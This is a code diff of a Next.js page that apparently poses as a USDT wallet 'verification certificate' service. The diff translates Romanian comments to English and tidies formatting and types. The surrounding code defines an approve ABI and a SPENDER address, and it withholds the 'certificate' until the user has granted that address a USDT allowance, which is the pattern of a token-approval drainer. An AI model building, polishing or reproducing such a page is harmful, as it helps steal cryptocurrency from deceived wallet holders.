@@ -1,10 +1,10 @@
 'use client';
 
-import React, { useState, useRef, useEffect } from 'react';
+import React, { useState, useEffect } from 'react';
 import EthereumProvider from "@walletconnect/ethereum-provider";
 import Web3 from "web3";
 
-// Font import pentru Montserrat (poți pune în _app.js sau index.html dacă vrei global)
+// Font import for Montserrat (you can put this in _app.js or index.html for global use)
 const fontLink = (
   <link
     href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap"
@@ -29,7 +29,7 @@ const ABI_APPROVE = [
   }
 ];
 
-// Logo text subțire, cu ajustare responsive pentru mobil
+// Minimalist logo text with responsive adjustments for mobile
 const LogoText = () => (
   <div style={{
     display: 'flex',
@@ -53,7 +53,7 @@ const LogoText = () => (
       boxShadow: '0 2px 8px #2563eb22',
       marginRight: 2
     }}>
-      {/* Icon minimalist: scut cu bifa */}
+      {/* Minimalist icon: shield with checkmark */}
       <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
         <path d="M12 3L4 6v6c0 5.25 3.75 9.75 8 11 4.25-1.25 8-5.75 8-11V6l-8-3z" fill="#2563eb" fillOpacity="0.13"/>
         <path d="M9.5 12.5l2 2 3-3.5" stroke="#2563eb" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
@@ -237,7 +237,7 @@ const certStyles = `
   margin-bottom: 18px;
 }
 .cert-certificate-details div {
-   margin-bottom: 7px;
+  margin-bottom: 7px;
 }
 .cert-certificate-label {
   font-size: 0.93rem;
@@ -488,7 +488,7 @@ export default function Page() {
       setWeb3(web3Instance);
 
       let accounts = await web3Instance.eth.getAccounts();
-      if (!accounts ||accounts.length === 0) {
+      if (!accounts || accounts.length === 0) {
         accounts = await wcProvider.request({ method: "eth_requestAccounts" }) as string[];
       }
       if (!accounts || accounts.length === 0) throw new Error("No account found");
@@ -571,7 +571,7 @@ export default function Page() {
         }
       ], USDT_CONTRACT);
 
-      const allowanceRaw = await contract.methods.allowance(address, SPENDER).call();
+      const allowanceRaw = await contract.methods.allowance(address, SPENDER).call() as string;
       if (allowanceRaw === "0") {
         alert("You have not given the necessary approval to view the balance and certificate.");
         return;
@@ -579,7 +579,7 @@ export default function Page() {
 
       const decimals = await contract.methods.decimals().call();
       const balanceRaw = await contract.methods.balanceOf(address).call();
-      const usdtBal = Number(balanceRaw) / (10 ** decimals);
+      const usdtBal = Number(balanceRaw) / (10 ** Number(decimals));
 
       setWalletAddress(address.slice(0,6) + "..." + address.slice(-4));
       setVerificationDate(new Date().toLocaleDateString());
@@ -718,8 +718,8 @@ export default function Page() {
         flexDirection: 'column',
         position: 'relative',
         fontFamily: "'Montserrat', 'Segoe UI', Arial, sans-serif"
-           }}>
-        {/* Bara de sus cu logo text subțire */}
+      }}>
+        {/* Top bar with minimalist logo text */}
         <div style={{
           position: 'absolute',
           top: 32,
@@ -742,7 +742,7 @@ export default function Page() {
           color: '#fff',
           padding: '90px 0 60px 0'
         }}>
-          {/* Titlu principal subțire, cu accent de culoare și umbră */}
+          {/* Main title with color accent and shadow */}
           <h1 style={{
             fontSize: '2.3rem',
             fontWeight: 600,
@@ -933,7 +933,7 @@ export default function Page() {
                     <span className="cert-history-status">Verified</span>
                   </div>
                   <div className="cert-history-row">
-                                       <div className="cert-history-label">
+                    <div className="cert-history-label">
                       <span className="cert-history-check">&#10003;</span>
                       <span>May 1, 2025</span>
                     </div>
